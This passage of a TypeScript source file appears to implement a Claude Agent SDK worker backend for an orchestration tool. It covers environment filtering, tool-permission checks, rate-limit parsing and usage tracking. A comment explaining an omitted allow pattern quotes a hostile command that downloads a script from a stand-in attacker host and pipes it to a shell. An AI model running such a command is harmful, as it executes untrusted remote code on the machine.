import { execFileSync } from "node:child_process";
import { isAbsolute } from "node:path";
import type {
  IWorkerBackend, BackendConfig, WorkerTaskInput, WorkerTaskOutput,
  PermissionConfig, InteractionHandler, ClarifyingQuestion, ProgressEvent,
  McpServerEntry, ModelReport,
} from "@mnmal-ai/swarm-types";

// ---------------------------------------------------------------------------
// Agent SDK types (defined locally to avoid CJS→ESM static import issues).
// These are subsets of the SDK's exported types — only the fields we read.
// ---------------------------------------------------------------------------

/** Subset of PermissionResult from @anthropic-ai/claude-agent-sdk. */
type AgentPermissionResult =
  | { behavior: "allow"; updatedInput?: Record<string, unknown>; updatedPermissions?: unknown[] }
  | { behavior: "deny"; message: string; interrupt?: boolean };

/** Subset of CanUseTool from @anthropic-ai/claude-agent-sdk. */
type AgentCanUseTool = (
  toolName: string,
  input: Record<string, unknown>,
  options: { signal: AbortSignal; suggestions?: unknown[]; toolUseID: string; [key: string]: unknown },
) => Promise<AgentPermissionResult>;

/** Subset of ModelUsage from the SDK result (only fields we read). */
interface AgentModelUsage {
  inputTokens: number;
  outputTokens: number;
  cacheReadInputTokens: number;
  cacheCreationInputTokens: number;
  webSearchRequests: number;
  contextWindow: number;
  maxOutputTokens: number;
}

/** Subset of the SDK's usage field including cache token fields. */
interface AgentUsage {
  input_tokens: number;
  output_tokens: number;
  cache_read_input_tokens?: number;
  cache_creation_input_tokens?: number;
}

/** Subset of SDKResultSuccess from the SDK generator output. */
interface AgentResultSuccess {
  type: "result";
  subtype: "success";
  result: string;
  usage: AgentUsage;
  /** Cumulative per-model token usage. Sum across models for totals. */
  modelUsage: Record<string, AgentModelUsage>;
  duration_ms: number;
}

/** Subset of SDKResultError from the SDK generator output. */
interface AgentResultError {
  type: "result";
  // The SDK's own subtype names; swarm never sets an SDK spending budget.
  subtype: "error_during_execution" | "error_max_turns" | "error_max_budget_usd";
  errors: string[];
  usage: AgentUsage;
  modelUsage: Record<string, AgentModelUsage>;
  duration_ms: number;
}

/** Subset of SDKAssistantMessage (for file tracking + progress). */
interface AgentAssistantMessage {
  type: "assistant";
  message: {
    /** The model that produced this response, as the API reported it. */
    model?: string;
    content: Array<{
      type: string;
      /** Present on `tool_use` blocks — Anthropic API's stable per-call
       *  id (the same value the user message echoes back as
       *  `tool_use_id` on tool_result blocks). Carried in the
       *  `tool_call` ProgressEvent meta so the orchestrator's
       *  ToolWedgeWatcher can populate `TaskToolWedgedEvent.activeTools`
       *  with stable ids instead of relying on order. */
      id?: string;
      name?: string;
      input?: Record<string, unknown>;
      text?: string;
    }>;
  };
}

/** Subset of SDKSystemMessage init subtype. */
interface AgentSystemInitMessage {
  type: "system";
  subtype: "init";
  model: string;
  tools: string[];
  cwd: string;
  permissionMode: string;
}

/** Subset of SDKSystemMessage status subtype. */
interface AgentStatusMessage {
  type: "system";
  subtype: "status";
  status: string | null;
}

/** Subset of SDKToolProgressMessage. */
interface AgentToolProgressMessage {
  type: "tool_progress";
  tool_name: string;
  tool_use_id: string;
  elapsed_time_seconds: number;
}

/** Subset of SDKToolUseSummaryMessage. */
interface AgentToolUseSummaryMessage {
  type: "tool_use_summary";
  summary: string;
}

type AgentMessage =
  | AgentResultSuccess
  | AgentResultError
  | AgentAssistantMessage
  | AgentSystemInitMessage
  | AgentStatusMessage
  | AgentToolProgressMessage
  | AgentToolUseSummaryMessage
  | { type: string; [key: string]: unknown };

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/** Only these environment variables are forwarded to the Agent SDK process. */
const ALLOWED_ENV_VARS = new Set([
  "PATH", "HOME", "USER", "LANG", "SHELL", "TERM",
  "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "NODE_ENV",
]);

/** Default permission mode for headless execution. */
const DEFAULT_PERMISSION_MODE = "acceptEdits";


// ---------------------------------------------------------------------------
// Rate limit detection
// ---------------------------------------------------------------------------

// Re-export from @mnmal-ai/swarm-types where it lives as a cross-cutting concern.
import { RateLimitError, LoginExpiredError, isLoginFailure, gitIdentityEnvVars, withoutGitHubAccess, defaultWorkerGhConfigDir } from "@mnmal-ai/swarm-types";
import { FNL_INSTRUCTION, FnlCoverageCounter, bashDenyRules, fnlPreToolUse } from "./fnl-hook.js";
import { FnlSavingsMeter, bashOutputLimit, fnlSavingsHook } from "./fnl-savings.js";
import { DocumentReadCounter, documentGuardPreToolUse } from "./doc-guard.js";
export { RateLimitError, LoginExpiredError };

/**
 * Parse a rate limit error message from Claude Code.
 * Known patterns:
 *   "You've hit your limit · resets 6pm (America/Chicago)"
 *   "You've hit your limit · resets 12am (America/New_York)"
 *
 * Returns a RateLimitError with the parsed reset time, or null if the
 * error is not a rate limit.
 */
export function parseRateLimitError(errorMessage: string, now?: Date): RateLimitError | null {
  const match = errorMessage.match(
    /hit your limit.*resets\s+(\d{1,2}(?::\d{2})?\s*[ap]m)\s*\(([^)]+)\)/i
  );
  if (!match) return null;

  const timeStr = match[1].trim(); // e.g. "6pm", "12:30am"
  const tzStr = match[2].trim();   // e.g. "America/Chicago"

  try {
    const currentTime = now ?? new Date();
    const resetAt = parseResetTime(timeStr, tzStr, currentTime);
    const waitMs = resetAt.getTime() - currentTime.getTime();

    // Sanity check — if reset is in the past or > 24h away, don't trust it
    if (waitMs <= 0 || waitMs > 24 * 60 * 60 * 1000) {
      return null;
    }

    const minutes = Math.ceil(waitMs / 60_000);
    return new RateLimitError(
      `Claude Code rate limit hit. Resets at ${timeStr} (${tzStr}) — ${minutes} minute(s) from now.`,
      resetAt,
      waitMs,
    );
  } catch {
    return null;
  }
}

/**
 * Parse a time string like "6pm" or "12:30am" in a given IANA timezone
 * into an absolute Date. Returns the next occurrence that is in the future.
 *
 * Strategy: try every hour-offset from now (0h to +24h) and check which
 * one, when rendered in the target timezone, shows the desired time.
 */
function parseResetTime(timeStr: string, timezone: string, now: Date): Date {
  const timeMatch = timeStr.match(/^(\d{1,2})(?::(\d{2}))?\s*([ap]m)$/i);
  if (!timeMatch) throw new Error(`Cannot parse time: ${timeStr}`);

  let targetHour = parseInt(timeMatch[1], 10);
  const targetMinute = timeMatch[2] ? parseInt(timeMatch[2], 10) : 0;
  const meridiem = timeMatch[3].toLowerCase();

  if (meridiem === "pm" && targetHour !== 12) targetHour += 12;
  if (meridiem === "am" && targetHour === 12) targetHour = 0;

  const formatter = new Intl.DateTimeFormat("en-US", {
    timeZone: timezone,
    hour: "2-digit", minute: "2-digit", hour12: false,
  });

  // Scan forward from now in 1-minute increments up to 24 hours
  // to find the UTC time that corresponds to our target time in the timezone.
  const ONE_MIN = 60 * 1000;
  for (let offsetMs = ONE_MIN; offsetMs <= 24 * 60 * 60 * 1000; offsetMs += ONE_MIN) {
    const candidate = new Date(now.getTime() + offsetMs);
    const parts = formatter.formatToParts(candidate);
    // Note: Intl may return "24" for midnight instead of "0"
    const rawH = parseInt(parts.find(p => p.type === "hour")?.value ?? "-1", 10);
    const h = rawH === 24 ? 0 : rawH;
    const m = parseInt(parts.find(p => p.type === "minute")?.value ?? "-1", 10);

    if (h === targetHour && m === targetMinute) {
      return candidate;
    }
  }

  throw new Error(`Cannot determine UTC time for ${timeStr} in ${timezone}`);
}

/** Default safe tool patterns that don't require interactive approval. */
const DEFAULT_ALLOWED_TOOLS = [
  "Read", "Edit", "Write", "Glob", "Grep",
  "Bash(git *)", "Bash(xcodebuild *)", "Bash(swift *)", "Bash(swiftc *)",
  "Bash(npm *)", "Bash(npx *)", "Bash(node *)",
  "Bash(ls *)", "Bash(find *)", "Bash(cat *)", "Bash(head *)", "Bash(tail *)",
  "Bash(wc *)", "Bash(grep *)", "Bash(mkdir *)", "Bash(cp *)", "Bash(mv *)",
  "Bash(chmod *)", "Bash(pwd)", "Bash(which *)", "Bash(echo *)",
  "Bash(python3 *)", "Bash(pip *)",
  // Note: "Bash(cd *)" is intentionally omitted — Claude Code already receives
  // the working directory as its process cwd, and "cd" patterns are over-permissive
  // (could match "cd /tmp && curl attacker.com | sh" via prefix matching).
];

/** Built-in tools a worker session gets unless its config lists its own: read,
 *  edit and run commands. Every tool defined in a session is re-sent on every
 *  API call, so tools a role never uses are left out rather than merely denied.
 *
 *  This is also what a ClaudeCodeBackend built without `tools` gets. `swarm run`
 *  gives reviewer and arbiter backends DEFAULT_REVIEW_TOOLS through
 *  roleBackendConfigs; code that builds one of those backends directly should
 *  pass it too.
 *
 *  AskUserQuestion and NotebookEdit are not in this set. SDK sessions do not
 *  define AskUserQuestion by default, before or after this set existed, so the
 *  clarifying-question route in buildCanUseTool runs only for a project that
 *  lists it; the same goes for NotebookEdit's change tracking. */
export const DEFAULT_WORKER_TOOLS: readonly string[] = ["Read", "Edit", "Write", "Glob", "Grep", "Bash"];

/** Built-in tools for reviewer and arbiter sessions, which are told not to
 *  modify files: read and run commands, with no file-editing tool (Edit, Write,
 *  NotebookEdit). Bash can still write files, so this narrows what the session
 *  is offered; it is not a write barrier. */
export const DEFAULT_REVIEW_TOOLS: readonly string[] = ["Read", "Glob", "Grep", "Bash"];

/** The account's claude.ai connectors (mail, drive, calendar and the like).
 *  Claude Code attaches them to any session signed in with a claude.ai account,
 *  SDK sessions included. Swarm never configures them, so workers never get them. */
const CLAUDE_AI_CONNECTORS = "mcp__claude_ai_*";

/** A built-in tool name: letters, digits and underscores, starting with a letter. */
const BUILT_IN_TOOL_NAME = /^[A-Za-z][A-Za-z0-9_]*$/;

/** Tool names that modify files — tracked for filesChanged reporting. */
const FILE_MODIFYING_TOOLS = new Set(["Write", "Edit", "NotebookEdit"]);

// ---------------------------------------------------------------------------
// Implementation
// ---------------------------------------------------------------------------

export class ClaudeCodeBackend implements IWorkerBackend {
  readonly type = "claude-code" as const;
  readonly supportsDirectExecution = true;
  private permissions: PermissionConfig;
  private interactionHandler?: InteractionHandler;
  private mcpServers?: Record<string, McpServerEntry>;
  /** Built-in tools the session gets; see BackendConfig.tools. */
  private tools: string[];
  /** Model override; undefined inherits the Agent SDK default. */
  readonly model: string | undefined;
  /** Identity for commits the agent makes itself; see BackendConfig.gitIdentity. */
  private gitIdentity: BackendConfig["gitIdentity"];
  /** Empty GH_CONFIG_DIR for the agent's processes; see BackendConfig.ghConfigDir. */
  private ghConfigDir: BackendConfig["ghConfigDir"];
  /** fnl to route Bash through; see BackendConfig.fnl and fnl-hook.ts. */
  private fnl: BackendConfig["fnl"];
  private queryTimeoutMs: number;

  /** Shell metacharacters that are not allowed in tool patterns. */
  private static readonly UNSAFE_TOOL_PATTERN = /[;&|`${}!<>]/;

  /** Cached claude binary path — resolved once, reused across queries. */
  private static _resolvedClaudePath: string | null | undefined;

  constructor(config: BackendConfig) {
    this.permissions = config.permissions ?? {};
    this.interactionHandler = config.interactionHandler;
    this.mcpServers = config.mcpServers;
    this.tools = [...(config.tools ?? DEFAULT_WORKER_TOOLS)];
    this.model = config.model;
    this.gitIdentity = config.gitIdentity;
    this.ghConfigDir = config.ghConfigDir;
    this.fnl = config.fnl;
    this.queryTimeoutMs = config.timeout === 0 ? 0 : ((config.timeout ?? 600) * 1000);

    // fnl is run without a shell; an absolute path means no PATH lookup can
    // pick up something else of that name.
    if (this.fnl && !isAbsolute(this.fnl.bin)) {
      throw new Error(`Rejected fnl.bin "${this.fnl.bin}": swarm run passes an absolute path to a supported fnl`);
    }

    // Validate tool patterns for injection metacharacters
    if (this.permissions.permissionPromptTool &&
        ClaudeCodeBackend.UNSAFE_TOOL_PATTERN.test(this.permissions.permissionPromptTool)) {
      throw new Error(`Rejected permissionPromptTool containing shell metacharacters: "${this.permissions.permissionPromptTool}"`);
    }
    for (const tool of this.permissions.allowedTools ?? []) {
      if (ClaudeCodeBackend.UNSAFE_TOOL_PATTERN.test(tool)) {
        throw new Error(`Rejected allowedTools entry containing shell metacharacters: "${tool}"`);
      }
    }
    for (const tool of this.permissions.deniedTools ?? []) {
      if (ClaudeCodeBackend.UNSAFE_TOOL_PATTERN.test(tool)) {
        throw new Error(`Rejected deniedTools entry containing shell metacharacters: "${tool}"`);
      }
    }
    for (const tool of this.tools) {
      if (!BUILT_IN_TOOL_NAME.test(tool)) {
        throw new Error(`Rejected tools entry "${tool}": list built-in tool names such as "Read" or "Bash"; permission patterns belong in permissions.allowedTools`);
      }
    }
    // Validate MCP server names — these become tool patterns (mcp__<name>__*).
    // Allowlist is stricter and more self-documenting than the blocklist approach.
    for (const serverName of Object.keys(this.mcpServers ?? {})) {
      if (!/^[a-zA-Z0-9_-]+$/.test(serverName)) {
        throw new Error(`Rejected mcpServers key with invalid characters (must match [a-zA-Z0-9_-]): "${serverName}"`);
      }
    }
  }

  /** Returns the configured MCP servers with `env` fields stripped (may contain secrets).
   *  For telemetry and logging use. The full config (including env) is passed internally to sdk.query(). */
  getMcpServers(): Record<string, Omit<McpServerEntry, "env">> | undefined {
    if (!this.mcpServers || Object.keys(this.mcpServers).length === 0) return undefined;
    const sanitized: Record<string, Omit<McpServerEntry, "env">> = {};
    for (const [name, server] of Object.entries(this.mcpServers)) {
      const { env: _env, ...rest } = server;
      sanitized[name] = rest;
    }
    return sanitized;
  }

  /** Returns the resolved allowed tools list, including auto-derived MCP patterns. */
  getAllowedTools(): string[] {
    const tools = [...(this.permissions.allowedTools ?? DEFAULT_ALLOWED_TOOLS)];
    if (this.mcpServers) {
      for (const serverName of Object.keys(this.mcpServers)) {
        tools.push(`mcp__${serverName}__*`);
      }
    }
    return tools;
  }

  async isAvailable(): Promise<boolean> {
    try {
      // Verify the Agent SDK is importable. Claude Code authenticates via
      // the user's account (Max/Pro), not via ANTHROPIC_API_KEY.
      await import("@anthropic-ai/claude-agent-sdk");
      return true;
    } catch {
      return false;
    }
  }

  async execute(input: WorkerTaskInput): Promise<WorkerTaskOutput> {
    const sdk = await import("@anthropic-ai/claude-agent-sdk");

    const perms = this.permissions;
    const mode = perms.mode ?? DEFAULT_PERMISSION_MODE;
    const allowedTools = this.getAllowedTools();

    // Build the canUseTool callback for interactive communication
    const canUseTool = this.buildCanUseTool();

    // Build filtered environment — only forward safe env vars, skip undefined values
    let filteredEnv: Record<string, string | undefined> = {};
    for (const [key, value] of Object.entries(process.env)) {
      if (ALLOWED_ENV_VARS.has(key) && value !== undefined) {
        filteredEnv[key] = value;
      }
    }
    // A configured git identity adds exactly the four GIT_AUTHOR_*/
    // GIT_COMMITTER_* vars, so commits the agent makes itself are authored and
    // committed as the project requires. Nothing else is widened.
    Object.assign(filteredEnv, gitIdentityEnvVars(this.gitIdentity));
    // Workers get no GitHub access: no token variable (whatever the allowlist
    // above ever grows to hold), and gh pointed at an empty config dir so it
    // finds no login and never falls back to the machine's keyring login.
    filteredEnv = withoutGitHubAccess(filteredEnv, this.ghConfigDir ?? defaultWorkerGhConfigDir());
    // No claude.ai connectors: Claude Code would otherwise attach the account's
    // (mail, drive, calendar…) to the session. They are denied below as well.
    filteredEnv.ENABLE_CLAUDEAI_MCP_SERVERS = "false";

    // AbortController for timeout — replaces the old subprocess timeout
    const abortController = new AbortController();
    const timeoutHandle = this.queryTimeoutMs > 0
      ? setTimeout(() => abortController.abort(), this.queryTimeoutMs)
      : null;

    // Capture stderr from the Claude Code subprocess for diagnostics.
    // Cap at 8KB to prevent unbounded memory growth from noisy subprocesses.
    const MAX_STDERR_BYTES = 8192;
    const stderrChunks: string[] = [];
    let stderrBytes = 0;
    const stderrCallback = (data: string) => {
      if (stderrBytes < MAX_STDERR_BYTES) {
        stderrChunks.push(data);
        stderrBytes += data.length;
      }
      if (process.env.SWARM_DEBUG) {
        process.stderr.write(`[claude-code:stderr] ${data}`);
      }
    };

    // Resolve the claude binary path at runtime (cached). In a Bun-compiled
    // binary, the SDK's bundled cli.js resolves to /$bunfs/root/cli.js (virtual
    // filesystem), which doesn't exist on disk. We must point to the real
    // claude executable.
    if (ClaudeCodeBackend._resolvedClaudePath === undefined) {
      try {
        ClaudeCodeBackend._resolvedClaudePath = execFileSync("which", ["claude"], { encoding: "utf-8", stdio: "pipe" }).trim();
      } catch {
        ClaudeCodeBackend._resolvedClaudePath = null;
      }
    }
    const claudePath = ClaudeCodeBackend._resolvedClaudePath ?? undefined;

    // An fnl that explains its decisions lets the session count how its Bash
    // commands fared (FnlCoverage); an older one, or none, counts nothing.
    const fnlCoverage = this.fnl?.json && this.tools.includes("Bash") ? new FnlCoverageCounter() : undefined;
    // Such a session also measures what each wrapped call saved, after it runs
    // (fnl-savings.ts).
    const fnlSavings = fnlCoverage ? new FnlSavingsMeter() : undefined;

    // Indexed documents are read by section: the guard refuses a read that
    // spans several sections over the limit, and counts the rest (doc-guard.ts).
    const guardDocuments =
      input.documents && input.documents.documents.length > 0 && (this.tools.includes("Read") || this.tools.includes("Bash"))
        ? input.documents
        : undefined;
    const documentReads = guardDocuments ? new DocumentReadCounter() : undefined;
    const preToolUse = [
      ...(guardDocuments && documentReads
        ? [
            {
              matcher: "Read|Bash",
              hooks: [
                documentGuardPreToolUse({ guard: guardDocuments, cwd: input.workingDirectory || undefined, reads: documentReads }) as never,
              ],
            },
          ]
        : []),
      // Route Bash through fnl when swarm run found one (see fnl-hook.ts).
      ...(this.fnl && this.tools.includes("Bash")
        ? [
            {
              matcher: "Bash",
              hooks: [
                fnlPreToolUse({
                  bin: this.fnl.bin,
                  wrap: this.fnl.wrap,
                  denyRules: bashDenyRules(perms.deniedTools ?? []),
                  cwd: input.workingDirectory || undefined,
                  ...(fnlCoverage ? { json: true, onDecision: (d) => fnlCoverage.add(d), savings: fnlSavings } : {}),
                }) as never,
              ],
            },
          ]
        : []),
    ];

    // Measures each call the fnl hook wrapped, once it has run (fnl-savings.ts).
    const fnlSavingsHooks =
      this.fnl && fnlSavings
        ? [
            {
              matcher: "Bash",
              hooks: [
                fnlSavingsHook({
                  bin: this.fnl.bin,
                  meter: fnlSavings,
                  cwd: input.workingDirectory || undefined,
                  // What the agent's own command would have shown is cut where
                  // Claude Code cuts it, by the session's own setting.
                  outputLimit: bashOutputLimit(filteredEnv.BASH_MAX_OUTPUT_LENGTH),
                }) as never,
              ],
            },
          ]
        : undefined;

    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const q = sdk.query({
      prompt: input.task,
      options: {
        ...(claudePath ? { pathToClaudeCodeExecutable: claudePath } : {}),
        systemPrompt: {
          type: "preset",
          preset: "claude_code",
          // A session whose Bash goes through fnl is told to run build and
          // test commands in a form fnl digests (see FNL_INSTRUCTION).
          append:
            this.fnl && this.tools.includes("Bash")
              ? [input.swarmContext, FNL_INSTRUCTION].filter((part) => part).join("\n\n")
              : input.swarmContext,
        },
        cwd: input.workingDirectory || undefined,
        maxTurns: input.maxTurns,
        // Omitted -> the SDK picks the operator's configured model. Named here
        // so background work cannot silently inherit an expensive one.
        ...(this.model === undefined ? {} : { model: this.model }),
        // Only the built-in tools this role uses; see BackendConfig.tools.
        tools: this.tools,
        // No user, project or local settings, plugins or CLAUDE.md. Named
        // explicitly: newer SDKs load them when this is omitted.
        settingSources: [],
        permissionMode: mode,
        allowedTools,
        disallowedTools: [...new Set([...(perms.deniedTools ?? []), CLAUDE_AI_CONNECTORS])],
        // Cast needed: our local AgentCanUseTool is a compatible subset of the SDK's
        // CanUseTool type, but TypeScript can't verify across the CJS/ESM boundary.
        canUseTool: canUseTool as never,
        env: filteredEnv,
        permissionPromptToolName: perms.permissionPromptTool,
        abortController,
        stderr: stderrCallback,
        // Don't persist SDK sessions — swarm manages its own session state
        persistSession: false,
        // bypassPermissions requires explicit opt-in
        ...(mode === "bypassPermissions" ? { allowDangerouslySkipPermissions: true } : {}),
        // Pass MCP servers if configured — enables tool use from MCP providers
        ...(this.mcpServers && Object.keys(this.mcpServers).length > 0
          ? { mcpServers: this.mcpServers }
          : {}),
        // The document guard, then fnl; a session with neither has no hooks.
        // A session that measures fnl's savings does so after each Bash call,
        // failed ones included.
        ...(preToolUse.length > 0
          ? { hooks: { PreToolUse: preToolUse, ...(fnlSavingsHooks ? { PostToolUse: fnlSavingsHooks, PostToolUseFailure: fnlSavingsHooks } : {}) } }
          : {}),
      },
    });

    // Consume the async generator and collect results
    const onProgress = this.interactionHandler?.onProgress;
    let resultText = "";
    let inputTokens = 0;
    let outputTokens = 0;
    let cacheReadTokens = 0;
    let cacheWriteTokens = 0;
    let durationMs = 0;
    let exitCode: number | undefined = 0;
    const filesChanged: string[] = [];
    const modelReport: ModelReport = { requested: this.model, responses: {}, usage: {} };

    try {
      for await (const rawMessage of q) {
        const message = rawMessage as AgentMessage;

        // Track files modified by Write/Edit/NotebookEdit tool calls
        trackChangedFiles(message, filesChanged);
        observeModels(message, modelReport);

        // Emit progress events to the caller
        if (onProgress) {
          const event = toProgressEvent(message);
          if (event) onProgress(event);
        }

        if (message.type === "result") {
          const result = message as AgentResultSuccess | AgentResultError;
          durationMs = result.duration_ms;

          // Sum cumulative tokens from modelUsage (per-model breakdown).
          // The SDK's `inputTokens` field only counts non-cached tokens.
          // Total input = inputTokens + cacheReadInputTokens + cacheCreationInputTokens.
          // The cache parts are also kept apart so the dashboard can show
          // fresh input separately from cached input.
          if (result.modelUsage && Object.keys(result.modelUsage).length > 0) {
            for (const model of Object.values(result.modelUsage)) {
              cacheReadTokens += model.cacheReadInputTokens ?? 0;
              cacheWriteTokens += model.cacheCreationInputTokens ?? 0;
              inputTokens += model.inputTokens
                + (model.cacheReadInputTokens ?? 0)
                + (model.cacheCreationInputTokens ?? 0);
              outputTokens += model.outputTokens;
            }
          } else {
            // Fallback: usage has cache fields at the top level
            const u = result.usage;
            cacheReadTokens = u.cache_read_input_tokens ?? 0;
            cacheWriteTokens = u.cache_creation_input_tokens ?? 0;
            inputTokens = (u.input_tokens ?? 0)
              + (u.cache_read_input_tokens ?? 0)
              + (u.cache_creation_input_tokens ?? 0);
            outputTokens = u.output_tokens ?? 0;
          }

          if (result.subtype === "success") {
            resultText = (result as AgentResultSuccess).result;
          } else {
            exitCode = 1;
            const errResult = result as AgentResultError;
            // Preserve diagnostic info even when errors array is empty
            resultText = errResult.errors?.length > 0
              ? errResult.errors.join("\n")
              : `Agent SDK query failed (${errResult.subtype}). Tokens: ${inputTokens.toLocaleString("en-US")} input, ${outputTokens.toLocaleString("en-US")} output; duration: ${durationMs}ms`;

            // Check error result for rate limit pattern
            const rateLimitErr = parseRateLimitError(redactSecrets(resultText));
            if (rateLimitErr) {
              throw rateLimitErr;
            }
            // An expired login fails every later session too: a run-level stop.
            if (isLoginFailure(resultText)) {
              throw new LoginExpiredError(redactSecrets(resultText).split("\n")[0].slice(0, 300));
            }
          }
        }
      }
    } catch (err) {
      if (abortController.signal.aborted) {
        // Only report "timed out" if we actually set a timer. When timeout is
        // unlimited (queryTimeoutMs === 0) an abort must have come from an
        // external signal, not our own timer.
        const msg = this.queryTimeoutMs > 0
          ? `Claude Agent SDK query timed out after ${this.queryTimeoutMs / 1000} seconds.`
          : `Claude Agent SDK query was aborted.`;
        throw new Error(msg);
      }
      if (err instanceof LoginExpiredError || err instanceof RateLimitError) throw err;
      const redacted = redactSecrets(String(err));

      // Check for rate limit before constructing the generic error
      const rateLimitErr = parseRateLimitError(redacted);
      if (rateLimitErr) {
        throw rateLimitErr;
      }
      // An expired login fails every later session too: a run-level stop.
      if (isLoginFailure(redacted)) {
        throw new LoginExpiredError(redacted.replace(/^Error:\s*/, "").split("\n")[0].slice(0, 300));
      }

      const stderrOutput = redactSecrets(stderrChunks.join("").trim());
      const stderrHint = stderrOutput
        ? `\n  stderr: ${stderrOutput.split("\n").slice(0, 5).join("\n  ")}`
        : "";
      throw new Error(`Claude Agent SDK query failed: ${redacted}${stderrHint}`);
    } finally {
      if (timeoutHandle) clearTimeout(timeoutHandle);
    }

    if (!resultText.trim()) {
      throw new Error("Claude Agent SDK query produced no output.");
    }

    // Only a session that wrapped a call has savings to report.
    const fnlSaved = fnlSavings?.snapshot();
    return {
      output: resultText,
      latencyMs: durationMs,
      tokensUsed: { input: inputTokens, output: outputTokens, cacheRead: cacheReadTokens, cacheWrite: cacheWriteTokens },
      filesChanged,
      exitCode,
      backendUsed: "claude-code",
      modelReport,
      ...(fnlCoverage ? { fnlCoverage: { ...fnlCoverage.snapshot(), ...(fnlSaved ? { savings: fnlSaved } : {}) } } : {}),
      ...(documentReads ? { documentReads: documentReads.snapshot() } : {}),
    };
  }

  /** Whether an `mcp__<server>__<tool>` name belongs to a server in this
   *  backend's mcpServers. Claude Code may write a server name's punctuation as
   *  underscores, so both spellings count. */
  private isConfiguredMcpTool(toolName: string): boolean {
    return Object.keys(this.mcpServers ?? {}).some((name) =>
      [name, name.replace(/[^A-Za-z0-9_]/g, "_")].some((server) => toolName.startsWith(`mcp__${server}__`)),
    );
  }

  /**
   * Build the canUseTool callback that routes:
   * - AskUserQuestion → interactionHandler.onClarifyingQuestion (or default: first option)
   * - A tool from an MCP server this backend did not configure → denied
   * - Other tools → interactionHandler.onToolApproval (or default: auto-approve)
   *
   * Exposed for testing.
   */
  buildCanUseTool(): AgentCanUseTool {
    const handler = this.interactionHandler;

    return async (
      toolName: string,
      toolInput: Record<string, unknown>,
    ): Promise<AgentPermissionResult> => {
      // Route AskUserQuestion to onClarifyingQuestion
      if (toolName === "AskUserQuestion") {
        if (handler?.onClarifyingQuestion) {
          const questions = parseQuestions(toolInput);
          const answers = await handler.onClarifyingQuestion(questions);
          return {
            behavior: "allow",
            updatedInput: { ...toolInput, answers },
          };
        }

        // Default: pick first option for each question (log so it's not silent)
        const rawQuestions = (toolInput.questions ?? []) as Array<Record<string, unknown>>;
        const defaultAnswers: Record<string, string> = {};
        for (const q of rawQuestions) {
          const options = (q.options ?? []) as Array<{ label: string }>;
          if (options.length > 0) {
            defaultAnswers[String(q.question)] = options[0].label;
          }
        }
        console.warn(`[swarm] AskUserQuestion auto-answered (no onClarifyingQuestion handler): ${Object.entries(defaultAnswers).map(([q, a]) => `"${q}" → "${a}"`).join(", ")}`);
        return {
          behavior: "allow",
          updatedInput: { ...toolInput, answers: defaultAnswers },
        };
      }

      // A tool from an MCP server swarm did not configure — the account's
      // claude.ai connectors, or anything else that reached the session — is
      // refused, whatever the handler or the headless default would say.
      if (toolName.startsWith("mcp__") && !this.isConfiguredMcpTool(toolName)) {
        return {
          behavior: "deny",
          message: `Tool "${toolName}" is from an MCP server this project did not configure`,
        };
      }

      // Route other tools to onToolApproval
      if (handler?.onToolApproval) {
        const result = await handler.onToolApproval({ toolName, input: toolInput });
        if (result.allow) {
          return { behavior: "allow", updatedInput: toolInput };
        }
        return {
          behavior: "deny",
          message: result.message ?? `Tool "${toolName}" denied by interaction handler`,
        };
      }

      // Default: auto-approve (headless mode)
      return { behavior: "allow", updatedInput: toolInput };
    };
  }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Track files changed by Write, Edit, and NotebookEdit tool calls from assistant messages.
 *  Exported for testing. */
export function trackChangedFiles(message: AgentMessage, filesChanged: string[]): void {
  if (message.type !== "assistant") return;

  const content = (message as AgentAssistantMessage).message?.content;
  if (!Array.isArray(content)) return;

  for (const block of content) {
    if (block.type !== "tool_use") continue;
    if (block.name && FILE_MODIFYING_TOOLS.has(block.name) &&
        block.input && typeof block.input.file_path === "string") {
      if (!filesChanged.includes(block.input.file_path)) {
        filesChanged.push(block.input.file_path);
      }
    }
    // NotebookEdit uses notebook_path instead of file_path
    if (block.name === "NotebookEdit" &&
        block.input && typeof block.input.notebook_path === "string") {
      if (!filesChanged.includes(block.input.notebook_path)) {
        filesChanged.push(block.input.notebook_path);
      }
    }
  }
}

/** Record which models served the session: the init message's session model,
 *  each assistant response's model, and the result's per-model usage.
 *  Exported for testing. */
export function observeModels(message: AgentMessage, report: ModelReport): void {
  if (message.type === "system" && (message as AgentSystemInitMessage).subtype === "init") {
    report.sessionModel = (message as AgentSystemInitMessage).model;
    return;
  }
  if (message.type === "assistant") {
    const model = (message as AgentAssistantMessage).message?.model;
    if (model) report.responses[model] = (report.responses[model] ?? 0) + 1;
    return;
  }
  if (message.type === "result") {
    const usage = (message as AgentResultSuccess | AgentResultError).modelUsage ?? {};
    for (const [model, u] of Object.entries(usage)) {
      report.usage[model] = {
        input: u.inputTokens + (u.cacheReadInputTokens ?? 0) + (u.cacheCreationInputTokens ?? 0),
        output: u.outputTokens,
      };
    }
  }
}

/** Map an Agent SDK message to a ProgressEvent, or null if not interesting.
 *  Exported for testing. */
export function toProgressEvent(msg: AgentMessage): ProgressEvent | null {
  const now = Date.now();

  if (msg.type === "system" && "subtype" in msg) {
    if ((msg as AgentSystemInitMessage).subtype === "init") {
      const init = msg as AgentSystemInitMessage;
      return {
        type: "session_init",
        detail: `Session started — model: ${init.model}, tools: ${init.tools?.length ?? 0}, cwd: ${init.cwd}`,
        timestamp: now,
        meta: { model: init.model, tools: init.tools, cwd: init.cwd, permissionMode: init.permissionMode },
      };
    }
    if ((msg as AgentStatusMessage).subtype === "status") {
      const status = (msg as AgentStatusMessage).status;
      if (status) {
        return { type: "status_change", detail: `Status: ${status}`, timestamp: now, meta: { status } };
      }
    }
  }

  if (msg.type === "assistant") {
    const content = (msg as AgentAssistantMessage).message?.content;
    if (!Array.isArray(content)) return null;

    const toolCalls = content.filter(b => b.type === "tool_use");
    const textBlocks = content.filter(b => b.type === "text" && b.text);

    if (toolCalls.length > 0) {
      const toolNames = toolCalls.map(b => b.name ?? "unknown");
      // Keep detail to tool names only — input previews (file paths, commands)
      // may contain sensitive data and belong in meta for opt-in access.
      const inputPreviews = toolCalls.map(b => {
        const inp = b.input ?? {};
        const preview = inp.file_path ?? inp.command ?? inp.pattern ?? inp.query ?? "";
        return { tool: b.name ?? "unknown", preview: String(preview).slice(0, 60) };
      });
      // tool_use_id is the stable per-call id from the Agent SDK content
      // block. Include it in the meta payload so the orchestrator can
